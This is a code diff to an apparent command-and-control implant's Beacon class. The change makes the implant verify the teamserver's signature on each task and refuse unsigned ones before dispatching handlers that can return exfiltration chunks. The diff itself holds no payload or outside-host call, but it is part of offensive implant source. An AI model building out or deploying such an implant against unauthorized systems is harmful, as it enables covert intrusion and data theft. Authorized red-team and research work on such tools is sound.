@@ -204,7 +204,25 @@ internal sealed class Beacon
         {
             var frame = call.ResponseStream.Current;
             var task = TaskRequest.Parser.ParseFrom(frame.Payload);
-            var (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
+
+            // Command signing (architecture.md Sec 9): verify the teamserver's
+            // signature before any handler runs. A task that fails verification
+            // is reported Failed with the cause -- the operator sees the
+            // rejection on the task itself -- and nothing executes.
+            TaskOutcome outcome;
+            string output;
+            IReadOnlyList<ExfilChunk> chunks;
+            if (!TaskingVerifier.Verify(_implantId, task, _cas))
+            {
+                _log.WriteLine($"task {task.TaskId} rejected: signature verification failed");
+                outcome = TaskOutcome.Failed;
+                output = "task rejected: signature verification failed; not executed";
+                chunks = Array.Empty<ExfilChunk>();
+            }
+            else
+            {
+                (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
+            }
             var result = new TaskResult
             {
                 TaskId = task.TaskId,
